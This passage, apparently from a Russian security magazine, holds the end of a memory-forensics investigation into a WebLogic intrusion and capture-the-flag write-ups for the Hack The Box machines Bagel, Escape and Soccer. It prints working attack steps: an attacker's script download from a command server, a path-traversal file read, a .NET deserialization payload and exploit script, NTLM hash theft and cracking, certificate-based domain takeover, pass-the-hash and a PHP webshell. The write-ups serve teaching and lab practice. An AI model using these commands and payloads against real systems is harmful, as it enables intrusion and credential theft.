работы с третьей версией заключается в том, что она не использует профили
операционной системы, а умеет определять их на лету, с помощью таблиц
символов Windows. Но большинство плагинов разработано для второй вер‐
сии.
   Получим профиль операционной системы для работы с утилитой Volatility
2.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem imageinfo

Профиль операционной системы — Win2016x64_14393.
   Прежде чем мы приступим к анализу артефактов, необходимо понять,
с какой системой мы работаем. Для этого получим версию операционной
системы, имя компьютера, а также сетевой адрес. Пробежимся по ключам
реестра с использованием плагина printkey.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 printkey -K "ControlSet001\Control\ComputerName\C
omputerName"





                      Имя компьютера

Имя компьютера — WIN-8QOTRH7EMHC.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 printkey -o 0xffff808fe7e41000 -K "ControlSet001\S
ervices\Tcpip\Parameters\Interfaces"





                           Список интерфейсов

Мы получили список идентификаторов сетевых интерфейсов. Проверим каж‐
дый из них.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 printkey -o 0xffff808fe7e41000 -K "ControlSet001\S
ervices\Tcpip\Parameters\Interfaces\{
792f6020-c342-4520-922a-542fbfccc4b6}"





                         Сетевой адрес системы

Сетевой адрес компьютера — 192.168.144.131, IP-адрес выдается DHCP-
сервером 192.168.144.254.
   Теперь получим информацию о версии операционной системы.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 printkey -K "Microsoft\Windows NT\CurrentVersion"





                      Версия операционной системы

Версия операционной системы — Windows Server 2016 Standard Evaluation.
   Получим время, которое было зафиксировано в момент снятия образа
оперативной памяти. Для этого воспользуемся плагином windows.info ути‐
литы Volatility 3.


python3 vol.py -f c63-bsidesjeddah-mem/memory.mem windows.info

Системное время — 2021-08-06 16:13:23.
   Далее попытаемся восстановить действия пользователя в системе. Про‐
анализируем историю браузера, в данном случае Internet Explorer. Для этого
воспользуемся плагином iehistory.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 iehistory > c63-bsidesjeddah-mem/iehistory.txt





                             История iehistory

Нам удалось выяснить, что 6 августа 2021 года пользователь Administrator
посетил страницу news.google.com.
   Теперь приступим к поиску вредоносной активности. Для этого нам необ‐
ходимо  проанализировать  процессы, сетевой  трафик, команды  запуска
исполняемых файлов, а также исследовать строки процессов.
  Для начала получим список запущенных в системе процессов, а также
сетевую активность и сохраним результат работы плагинов в файлы pstree.
txt и netscan.txt соответственно.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 pstree > c63-bsidesjeddah-mem/pstree.txt


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 netscan > c63-bsidesjeddah-mem/netscan.txt

В списке процессов можно заметить программу RamCapture.exe компании
Belkasoft.
  В файле netscan.txt отмечено двенадцать стабильных сетевых соеди‐
нений, об этом нам говорит колонка State, демонстрирующая работу пла‐
гина netscan с установленным значением ESTABLISHED.
   Проанализируем дерево процессов и найдем среди них аномальные.
Необходимо обращать внимание на процессы, которые запускают дочерний
процесс  с  именами cmd.exe, powershell.exe, conhost.exe,  а  также
на исполняемые файлы с нестандартным расположением.





                      Процессы, запущенные от java.exe

Процессом java.exe (идентификатор 4752) запущено множество дочерних
powershell.exe, что может свидетельствовать о подозрительной активнос‐
ти.  Также  у  процесса powershell.exe (идентификатор 4344) запущены
дочерние  процессы conhost.exe  (идентификатор 4636) и svchost.exe
(идентификатор 1488).
   Получим дамп данных процессов и проанализируем их строки.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 memdump -p 4752 -D c63-bsidesjeddah-mem/

Мы сохранили дамп в файл 4752.dmp.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 memdump -p 4344 -D c63-bsidesjeddah-mem/

Результат работы сохранен в файле 4344.dmp.
   Теперь с помощью утилиты strings вытащим все строки и сохраним их
в файл.


strings 4752.dmp > str_4752.txt


strings 4344.dmp > str_4344.txt

Прежде чем анализировать строки, получим аргументы командной строки
для запуска процессов. Для этого воспользуемся плагином cmdline и найдем
в нем процесс java.exe (идентификатор 4752).


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 cmdline > c63-bsidesjeddah-mem/cmdline.txt



                              Запуск вер‑сервера

Процесс cmd.exe (идентификатор 4556), который является родителем про‐
цесса java.exe (4752), запускает сервер WebLogic. Значит, процесс java.
exe — результат работы веб‑сервера.
   Выясним версию WebLogic, для этого получим список файлов в системе.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 filescan > c63-bsidesjeddah-mem/filescan.txt

Анализируя  список  файлов, мы  обнаруживаем файл лога  веб‑сервера
WebLogic — AdminServer.log.


                          Виртуальный адрес файла

Восстановим его и проанализируем: виртуальный адрес файла в образе
памяти — 0xb68cb2c205c0. Восстановить этот файл с использованием ути‐
литы Volatility 2 мне не удалось, попробуем это сделать с помощью Volatility 3.


python3 vol.py -f c63-bsidesjeddah-mem/memory.mem windows.dumpfiles
--virtaddr 0xb68cb2c205c0

В восстановленном файле указана версия WebLogic Server — 14.1.1.0.0.


                        Версия WebLogic-сервера

Слушатель WebLogic Server работает на порте 7001, но запросы к веб‑сер‐
веру идут на 80-й порт.
   Найдем перенаправление порта в ключе реестра PortProxy, для этого
воспользуемся плагином printkey.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 printkey  -K "ControlSet001\Services\PortProxy\v
4tov4\tcp"





                         Значение ключа PortProxy

В системе установлено перенаправление порта 80:7001.
  Мы выяснили версию веб‑сервера: она уязвима и позволяет выполнять
удаленный код в системе. В файле лога AdminServer.log видны результаты
выполнения  функции  com.tangosol.coherence.mvel2.sh.ShellSession,
а      также      запрос      к     /console/%2E%2E%2Fconsole.portal?
_nfpb=true&_pageLabel=UnexpectedExceptionPage.





                        Содержимое файла лога

Теперь  найдем  процесс, через который  злоумышленник  получил  пер‐
воначальный доступ. У нас есть дамп процесса 4752, мы нашли его строки,
теперь отыщем в нем GET-запрос с параметром handle=com.tangosol.
coherence.mvel2.sh.ShellSession.





                     Содержимое параметра handle

Итак, искомый процесс — это java.exe, идентификатор 4752. Именно он был
ответственен за первоначальный доступ к системе. Злоумышленник проэкс‐
плуатировал  уязвимость  CVE-2020-14882  в  сервере  WebLogic  вер‐
сии 14.1.1.0.0, позволяющую выполнять удаленный код в системе. Как видно
из иллюстрации выше, хакер запустил обратную оболочку с управляющим
сервером 192.168.144.129:1339.
   Анализируя работу плагина netscan, можно увидеть запущенный процесс
powershell.exe   (идентификатор   4344),   который    взаимодействует
с 192.168.144.129:1339.


                         Результат работы плагина netscan

Воспользуемся плагином  pslist и найдем следующий процесс в списке
ActiveProcessLinks, его идентификатор 4772.




                   Список процессов ActiveProcessLinks

Как видно из иллюстрации, процесс java.exe имеет 44 потока. Продолжим
анализировать строки процесса java.exe.
  В результате анализа строк можно увидеть загрузку файлов presist.ps1
и pastebin.ps1.


                        Загрузка PowerShell-сценариев

Попробуем восстановить команды для загрузки этих файлов. Так как команды
выполняются с использованием PowerShell, получим дамп всех процессов
powershell.exe, запущенных от имени java.exe (идентификатор 4752).
Для этого воспользуемся плагином memdump. Восстановим команду для заг‐
рузки сценариев PowerShell.


strings -e l ./out_powershell/* | grep -i 'presist.ps1' | sort -u



                         Команда Invoke-WebRequest

Команда для загрузки сценария presist.ps1 выглядит следующим образом:


Invoke-WebRequest -Uri "http://192.168.144.129:1338/presist.ps1"
-OutFile "./presist.ps1"

Загрузка файла pastebin.ps1 выполнялась при помощи следующей коман‐
ды:


strings -e l ./out_powershell/* | grep -i 'presist.ps1' | sort -u



                             Загрузка pastebin.ps1

Найдем код pastebin.ps1 и проанализируем его. Для этого будем искать
этот код в строках дампа наших процессов. При исследовании результатов
вывода плагина cmdline мы заметили, что процесс notepad.exe (идентифика‐
тор 4596) открыл файл exfiltrator.txt.



                   Аргументы запуска процесса notepad.exe

Получим дамп процесса 4596 и проанализируем строки.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 memdump -p 4596 -D c63-bsidesjeddah-mem/





                          Содержимое скрипта

Этот  скрипт  предназначен для  выгрузки  текстовых  файлов на ресурс
pastebin.com, но ему в качестве параметра необходимо указать ссылку.
Поиск ссылки на выгрузку файлов в строках дампа процесса notepad.exe
не дал результатов.
  В  строках  вредоносного  процесса 4344  удалось обнаружить  ссылку
https://pastebin.com/A0Ljk8tu для  выгрузки  файлов.  Значит,  скрипт
pastebin.ps1 запускался от имени данного процесса.
   Найдем методы закрепления злоумышленника в системе. Для этого вос‐
пользуемся плагином autoruns или проанализируем строки процесса 4344.





                           Закрепление в системе

Злоумышленник создал службу ServiceUpdate, которая запускает обратную
оболочку с управляющим сервером 192.168.144.129, порт 1339. Согласно
матрице MITRE ATT&CK, идентификатор этой техники — T1053.005.
   Продолжаем анализировать вредоносные процессы. Получим дамп про‐
цесса svchost.exe (идентификатор 1488), найдем виртуальный адрес рас‐
положения этого файла в системе и с помощью плагина windows.dumpfiles
утилиты Volatility 3 выгрузим файл.


                     Расположение файла svchost.exe

Виртуальный адрес файла в образе памяти — 0xb68cb2b8a080. Восстановим
его.


python3 vol.py -f c63-bsidesjeddah-mem/memory.mem windows.dumpfiles
--virtaddr 0xb68cb2b8a080

После        восстановления      получим      MD5-сумму       файла
2c5ae1d11a02d19ab65f5fc06a33d603 и проверим ее на VirusTotal. Согласно
отчету антивирусных компаний, перед нами полезная нагрузка фреймворка
Cobalt Strike. Получим дамп процесса и попробуем вытащить конфигурацию
C2.


python2.7 vol.py -f c63-bsidesjeddah-mem/memory.mem --profile=
Win2016x64_14393 memdump -p 1488 -D c63-bsidesjeddah-mem/

Загрузим утилиту CobaltStrikeParser и найдем в памяти процесса конфигура‐
цию маяка.


python3 parse_beacon_config.py  ../pid.1488.dmp --version 4

Мы узнали тип маяка (HTTP), адрес управляющего сервера (192.168.144.
129), порт (1339), а также публичный ключ. Получим MD5-сумму ключа.


echo MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCknNpTPXGlTqpVXN9GP8xG/
Otf4yDG2QQCJFReupN16br/aMd+0RTSqOmKCjMHdR6fm133/
abvH1KVRge7oNowjO0RvdKVZTnNZqPnOkruOd7pDvjcJ13huwnsGA6rqW3jwNNb1hDix6
K4H+DGYx/
RQTxDc/nhj59Ae/5Tz9iC/QIDAQAB" | base64 -d | md5sum

MD5-сумма публичного ключа — fc627cf00878e4d4f7997cb26a80e6fc.


ВЫВОДЫ

Мы провели  расследование  инцидента и  восстановили  картину взлома
ресурса: 6 августа 2021 года злоумышленник проэксплуатировал уязвимость
CVE-2020-14882 в Oracle WebLogic Server, которая позволяет не прошедшим
авторизацию пользователям выполнять удаленный код в системе.
   Таким образом атакующий загрузил обратную оболочку с управляющим
сервером 192.168.144.129, порт 1339. Далее он закрепился в системе, соз‐
дав службу ServiceUpdate. Для этого злоумышленник загрузил PowerShell-
сценарий presist.ps1. Данный сценарий создает службу ServiceUpdate,
которая запускает обратную оболочку.
  Для эксфильтрации данных злоумышленник загрузил сценарий pastebin.
ps1, который отправляет собранные файлы на удаленный сервер. Затем ата‐
кующий загрузил маяк Cobalt Strike для постэксплуатации в системе.
  В ходе нашего расследования мы научились извлекать конфигурацию
маяка из памяти, а также искать важные артефакты в памяти процессов.
ВЗЛОМ

       HTB
  BAGEL





        ЗАХВАТЫВАЕМ СЕРВЕР
     ЧЕРЕЗ ДЕСЕРИАЛИЗАЦИЮ JSON
              В .NET





В этом райтапе я покажу, как реверсить
библиотеку .NET DLL,  чтобы  найти  уяз‐
вимость в ней. По пути проэксплуатируем
уязвимость LFI в веб‑сайте, а при повыше‐
нии   привилегий   задействуем   технику             RalfHacker                                                                                             hackerralf8@gmail.com
GTFOBins для приложения .NET, запущен‐
ного в Linux.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.201    bagel.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Нашли три открытых порта:
 • 22 — служба OpenSSH 8.8;
 • 5000 и 8000 — веб‑сервер Python 3.10.9.

На SSH делать нечего, поэтому сразу переходим к изучению веб‑сервера.
Как показал отчет, на порте 8000 мы угадали имя домена — bagel.htb.





                    Главная страница http://bagel.htb:8000




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          HTB BAGEL
                          ЗАХВАТЫВАЕМ СЕРВЕР
               ЧЕРЕЗ ДЕСЕРИАЛИЗАЦИЮ JSON В .NET





ТОЧКА ВХОДА
Видим, что целевая страница передается в параметре page. В таком случае
первым делом нужно проверить возможность включения произвольного фай‐
ла путем обхода каталогов. Для теста пробуем прочитать файлы /etc/passwd
или /etc/hosts.


curl 'http://bagel.htb:8000/?page=../../../../etc/passwd'





                     Содержимое файла /etc/passwd

Сразу же удалось прочитать файл!
   Теперь возьмем на GitHub список важных и интересных файлов в Linux
и переберем их с помощью Burp Intruder.





                    Burp Intruder — вкладка Positions





                   Burp Intruder — результат перебора

Очень интересный файл — /proc/self/cmdline, который содержит полную
команду командной строки текущего процесса. Этот файл раскрывает нам
путь к файлу с кодом скрипта. С помощью LFI скачиваем исходник, открываем
в любой среде разработки (я использую VSCode) и переходим к анализу.


wget 'http://bagel.htb:8000/?page=../../../../../../../home/
developer/app/app.py' -O app.py





                       Содержимое файла app.py

Из кода выясняем, что мы можем  подключиться  к веб‑сокету на пор‐
те 5000 и передать данные в формате JSON, которые потом будут обработа‐
ны методом json.loads. Из комментария узнаем о подключенной DLL.


LFI
Попробуем перебрать командные строки для всех процессов в системе,
для чего с помощью Burp Intruder будем менять PID процесса.





                    Burp Intruder — вкладка Positions





                    Burp Intruder — вкладка Payloads

Чтобы получить командные строки в удобном виде для всех запросов,
зададим параметр Grep — Extract. Тогда Burp будет извлекать командную
строку из ответа сервера и выводить в отдельном столбике.





                Burp Intruder — настройка Grep — Extract





                                 Результат перебора

В результате видим процесс dotnet, который в качестве параметра получает
файл DLL, то есть библиотеку, о которой мы знаем из комментария. Скачива‐
ем найденный DLL для дальнейшего анализа.


wget 'http://bagel.htb:8000/?page=../../../../../../../opt/bagel/bin/
Debug/net6.0/bagel.dll' -O bagel.dll

Так как это файл .NET, его можно декомпилировать. Для этого есть отличное
средство dnSpy. Открываем его, загружаем скачанный DLL и первым делом
обращаем внимание на класс DB. В исходном коде этого класса находим
учетные данные для подключения к базе данных.





                        Исходный код класса DB

Авторизоваться на SSH с этим паролем не вышло, поэтому проводим осно‐
вательный анализ файла. Мы уже знаем, что программа работает на пор‐
те 5000 и принимает данные в формате JSON, после чего выполняет десери‐
ализацию объекта и сериализацию (функция MessageReceived).





                       Исходный код класса Bagel

Из функции DeserializeObject узнаем, что в параметре принимаемого
JSON существует ключ Message.





                      Исходный код класса Handler

А из класса Orders узнаем о возможности удаления, записи и чтения заявок.





                       Исходный код класса Orders

В классе Orders обратим внимание вот на эту функцию:


RemoveOrder {get; set;}




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          HTB BAGEL
                          ЗАХВАТЫВАЕМ СЕРВЕР
               ЧЕРЕЗ ДЕСЕРИАЛИЗАЦИЮ JSON В .NET





ТОЧКА ОПОРЫ
Мы можем использовать уязвимость десериализации и в качестве параметра
предоставить сериализованный объект, что приведет к его выполнению. Так,
в программе есть класс File, который содержит функцию ReadFile, чита‐
ющую файл order.txt в каталоге /opt/bagel/orders/.





                        Исходный код класса File





                 Исходный код класса File (продолжение)

Будем использовать функцию ReadFile для чтения произвольных файлов
с помощью следующей нагрузки.


{
    "RemoveOrder": {
        "$type": "bagel_server.File, bagel",
        "ReadFile": "../../../../../../etc/passwd"
    }
}

В атрибуте $type указываем тип объекта bagel_server.File, bagel, а в
атрибуте ReadFile —  путь  к  читаемому  файлу. Для работы  коннекта
с веб‑сокетом напишем простой код на Python.


import asyncio
import json
import sys
from websockets import connect


async def hello(uri):
   async with connect(uri) as websocket:
       order = {"RemoveOrder": {"$type": "bagel_server.File, bagel",
"ReadFile": "../../../../../.." + sys.argv[1]}}
       data = str(json.dumps(order))
       await websocket.send(data)
       resp = await websocket.recv()
       print(json.loads(resp)["RemoveOrder"]["ReadFile"])


asyncio.run(hello("ws://bagel.htb:5000/"))





                     Содержимое файла /etc/passwd

Так как приложение может работать от имени другого пользователя (не www-
data), пробуем прочитать приватный SSH-ключ ~/.ssh/id_rsa и получаем
его.





                    Приватный SSH-ключ пользователя phil

Копируем  ключ,  назначаем необходимые  права командой chmod  0600
id_rsa и подключаемся к хосту.




                       Флаг пользователя


ПРОДВИЖЕНИЕ
Вспоминаем, что у нас есть пароль для подключения к базе данных, который
мы узнали раньше. Попробуем использовать его для авторизации от имени
пользователя developer локально. Пароль подошел, и мы получили новую
сессию.




                      Сессия пользователя developer


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Одно из первых мест, которые нужно проверить при повышении привиле‐
гий, — это настройки sudoers. Получить их можно командой sudo -l.





                               Настройки sudoers

Так мы узнаем, что можем выполнить команду /usr/bin/dotnet от имени
пользователя root без ввода пароля. В таких случаях первым делом я про‐
веряю базу GTFOBins: нет ли там готовых трюков для нужного приложения?
Способ эксплуатации программы dotnet под sudo нашелся.


Справка: GTFOBins
GTFOBins — это подборка способов  злоупотребления  функциями  рас‐
пространенных программ для Unix. Используя эти рецепты, можно быстро
получить доступ к командным оболочкам, повысить привилегии или передать
файлы.





                    Техника эксплуатации dotnet под sudo

Значит, мы можем открыть dotnet в интерактивном режиме и запустить файл
командной оболочки, что даст нам шелл в привилегированном контексте.


sudo /usr/bin/dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;





                           Флаг рута

У нас есть флаг рута, а значит, машина захвачена!
ВЗЛОМ

       HTB
 ESCAPE





      ЭКСПЛУАТИРУЕМ ТИПИЧНЫЕ
    УЯЗВИМОСТИ ACTIVE DIRECTORY





В этом райтапе я на примерах покажу,
как применять простейшие техники для зах‐
вата домена: анонимный логин на SMB-
ресурсе, эксфильтрацию NTLM-хеша из MS
SQL и повышение привилегий ESC1 через             RalfHacker                                                                                             hackerralf8@gmail.com
службу сертификации Active Directory.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.202    escape.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

В результатах сканирования видим множество открытых портов, что типично
для серверов Windows:
 • 53 — служба DNS;
 • 135 — служба удаленного вызова процедур (Microsoft RPC). Используется
   для операций взаимодействия контроллер — контроллер и контроллер —
   клиент;
 • 139 — служба сеансов NetBIOS, NetLogon;
 • 389 — служба LDAP;
 • 445 — служба SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 5985 — служба удаленного управления WinRM;
 • 9389 — веб‑службы AD DS.

RDP и LDAP раскрывают нам имя домена и компьютера. Добавим их в /etc/
hosts.


10.10.11.202 escape.htb sequel.htb dc.sequel.htb


ТОЧКА ВХОДА
Первым делом пробуем авторизацию от имени гостя на разных службах,
начиная с SMB. Для тестирования SMB лучше всего использовать программу
CrackMapExec, для которой уже успели написать множество дополнитель‐
ных модулей.


cme smb 10.10.11.202 -u 'guest' -p '' --shares





                        Общие ресурсы SMB

Каталог Public — нестандартный, поэтому нас интересует его содержимое.
Для  работы  с  SMB-ресурсом будем  использовать  скрипт  impacket-
smbclient из набора скриптов impacket.


impacket-smbclient 'guest@10.10.11.202'
use Public





                   Содержимое общего ресурса Public

Ресурс содержит документ PDF, который можно скачать такой командой:


get SQL Server Procedures.pdf

Файл будет сохранен в текущем каталоге. Просматриваем файл и находим
учетные данные для подключения к службе MS SQL.





                 Содержимое скачанного PDF-документа


ТОЧКА ОПОРЫ
В списке открытых портов отсутствует порт 1433, на котором по умолчанию
работает служба MS SQL Server, но, несмотря на это, все равно попробуем
подключиться  к  службе с помощью  скрипта  impacket-mssqlclient, тоже
из impacket.


impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.
11.202

Подключиться к службе удалось, поэтому пробуем увести хеш пароля поль‐
зователя, от имени которого и работает служба. Запускаем на локальном
хосте утилиту responder, которая поможет нам получить хеш.


sudo responder -I tun0 -v

А теперь обращаемся к ресурсу из SQL с помощью команды xp_dirtree.


xp_dirtree '\\10.10.14.125\test'





                         Запрос на сервер из SQL




                         Полученный NetNTLMv2-хеш

Получаем NetNTLMv2-хеш пароля пользователя sql_svc. Этот тип хеша
перебирается очень быстро. Брутить будем при помощи hashcat, указав
режим перебора 5600.


hashcat -m 5600 -a 0 hashes.txt rockyou.txt





                            Результат перебора пароля

Полученный пароль проверяем с помощью CrackMapExec. Пробуем авто‐
ризоваться для использования службы WinRM.


cme winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'




                           Проверка учетных данных

А теперь подключаемся к службе WinRM с помощью утилиты evil-winrm.


evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie





                       Сессия пользователя sql_svc


ПРОДВИЖЕНИЕ
Теперь нам необходимо собрать информацию. Обычно я использую для это‐
го  скрипты PEASS, и если в  Linux  альтернатив им не  существует, то
для Windows есть еще SharpUp и Seatbelt. Второй помог найти сервер
службы сертификации Active Directory (ADCS) — sequal-DC-CA.


.\Seatbelt.exe -group=system





                       Информация о сертификатах

Также на диске C: находим каталог SQLServer, а в нем — логи службы.





                     Содержимое каталога SQLServer

В самом логе есть сообщения об ошибке авторизации пользователя Ryan.
Cooper, а также пользователя NuclearMosquito3. Второе имя пользователя
похоже на введенный по ошибке пароль. Распространенная ошибка, которой
мы сможем воспользоваться.





                   Содержимое файла ERRORLOG.BAK

Проверим, входит ли найденный пользователь в группу Remote Management
Users. Членство в ней дает пользователям право авторизации на службе
WinRM.


net localgroup "Remote Management Users"





                  Члены группы Remote Management Users

Так мы можем залогиниться на WinRM, что дает нам интерактивную сессию
пользователя.


evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Теперь вернемся к службе сертификации Active Directory, которая часто
может помочь захватить целый домен. В основном способы эксплуатации
ADCS завязаны на неправильно сконфигурированные шаблоны сертифика‐
тов, а также на права доступа к этим шаблонам и самой службе.
   Получить информацию о службе сертификации  позволяет программа
Certify. Запускаем ее с командой find.


.\Certify.exe find /vulnerable





       Информация о службе ADCS и уязвимый шаблон сертификата

Certify нашла «уязвимый шаблон сертификата» и оказалась права. Каждая
техника имеет свою маркировку, и в данном случае мы можем использовать
технику ESC1. Этому способствует выполнение следующих требований:
 1. У шаблона сертификата в свойстве msPKI-Certificate-Name-Flag
   установлен флаг ENROLLEE_SUPPLIES_SUBJECT, в результате чего зап‐
   рашивающий может сам установить атрибут SAN (subjectAltName).
 2. Сертификат можно использовать для аутентификации клиента  (client
  authentication).
 3. Текущий  пользователь  имеет  права  для  регистрации  сертификата
   без утверждения менеджера ADCS.

Таким образом, эта техника основана на возможности изменения SAN сер‐
тификата и  позволяет  выпустить  сертификат для любого  пользователя
домена,  включая  администратора  домена!  Это  тоже  можно  сделать
с помощью Certify.


.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:
UserAuthentication /altname:Administrator





             Выпуск сертификата для пользователя Administrator

И мы получаем сертификат и приватный ключ, который можно использовать
для аутентификации пользователя в домене. Но сначала нужно перевести
сертификат из формата PEM в формат PFX.


openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced
Cryptographic Provider v1.0" -export -out cert.pfx

А теперь с помощью еще одного незаменимого инструмента — Rubeus —
проведем атаку pass the cert для аутентификации в домене и получения
тикета пользователя Administrator. Затем выполним атаку UnPAC the hash,
чтобы получить тикет пользователя и NTLM-хеш его пароля. Rubeus позволя‐
ет сделать все это одной командой.


.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /
password:123 /getcredentials





               Выполнение атак pass the cert и UnPAC the hash

А теперь с помощью pass the hash подключаемся к службе WinRM и забираем
флаг рута.


evil-winrm -i 10.10.11.202 -u 'Administrator' -H
'A52F78E4C751E5F5E17E1E9F3E58F4EE'





                           Флаг рута

Машина захвачена!
ВЗЛОМ

       HTB
 SOCCER





      ПОВЫШАЕМ ПРИВИЛЕГИИ
    В LINUX ЧЕРЕЗ СВОЙ ПЛАГИН ДЛЯ
              DOAS





В этом райтапе я покажу, как написать вре‐
доносный плагин для doas — замены sudo,
которая   считается  более  безопасной.
Но прежде, чем будем захватывать сис‐
тему, мы проникнем в нее благодаря RCE             RalfHacker                                                                                             hackerralf8@gmail.com
в Tiny File Manager, а затем напишем свой
плагин для sqlmap, чтобы повысить при‐
вилегии.


Полигоном для всех этих упражнений нам послужит тренировочная машина
Soccer с площадки Hack The Box. Уровень ее сложности отмечен как легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.194    soccer.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер обнаружил три открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 80 — веб‑сервер Nginx 1.18.0;
 • 9091 — неизвестный веб‑сервер.

Порт 9091 пока загадочен для нас, SSH, как всегда, оставляем до момента,
когда мы завладеем учетной записью, поэтому остается только изучать сайт,
расположенный на порте 80.





                      Главная страница сайта soccer.htb

Нас встречает сайт‑визитка. Поскольку никаких интересных функций у него
нет, перейдем к активному сканированию и попытаемся выявить скрытые
файлы и каталоги.


ТОЧКА ВХОДА
Первым делом сканируем скрытые каталоги на веб‑сервере с помощью
feroxbuster .


Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или  ffuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -d — глубина сканирования.





feroxbuster -u http://soccer.htb/ -w directory_2.3_medium_lowercase.
txt -t 256




                        Результат сканирования каталогов

На странице /tiny нас встречает страница авторизации Tiny File Manager.





                  Страница авторизации Tiny File Manager

На вики‑странице Security and User Management находим учетные данные,
выставляемые по умолчанию:


admin : admin@123
user : 12345





             Учетные данные по умолчанию для Tiny File Manager

Повезло! Авторизуемся с учетной записью admin и получаем доступ к фай‐
ловому менеджеру.





                  Главная страница файлового менеджера

Мы раздобыли какие‑то файлы, но нам нужны не они, а доступ к системе.
Попробуем поискать готовые эксплоиты для Tiny File Manager, благо версия
указана — 2.4.3.
   Первая же ссылка в Google сообщает нам о том, что есть RCE через заг‐
рузку файла.





                         Поиск эксплоитов в Google


ТОЧКА ОПОРЫ
Сканирование каталогов показало, что существует каталог uploads. Заг‐
рузим туда самый простой веб‑шелл.


<?php system($_GET['cmd'])?>





                                Загрузка файла





                         Листинг директории /uploads

